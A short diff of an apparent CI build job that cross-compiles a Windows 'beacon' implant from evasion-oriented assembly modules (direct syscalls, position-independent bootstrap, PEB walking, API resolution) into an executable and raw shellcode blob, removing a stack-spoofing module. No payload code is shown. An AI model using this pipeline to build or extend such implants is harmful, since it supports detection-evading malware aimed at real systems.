@@ -37,11 +37,11 @@ build_windows:
   script:
     - *beacon_crypto
     - cd ${BEACON_DIR}
-    - for asm in syscalls pic_bootstrap peb_walker api_resolver stack_spoofer; do
+    - for asm in syscalls pic_bootstrap peb_walker api_resolver; do
         x86_64-w64-mingw32-as src/${asm}.asm -o src/${asm}.o;
       done
     - x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -Isrc -o beacon.exe src/main.cpp
-      src/syscalls.o src/pic_bootstrap.o src/peb_walker.o src/api_resolver.o src/stack_spoofer.o
+      src/syscalls.o src/pic_bootstrap.o src/peb_walker.o src/api_resolver.o
       -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static
     - x86_64-w64-mingw32-objcopy -O binary beacon.exe beacon.bin 2>/dev/null || echo "objcopy not available, .bin skipped"
   artifacts:
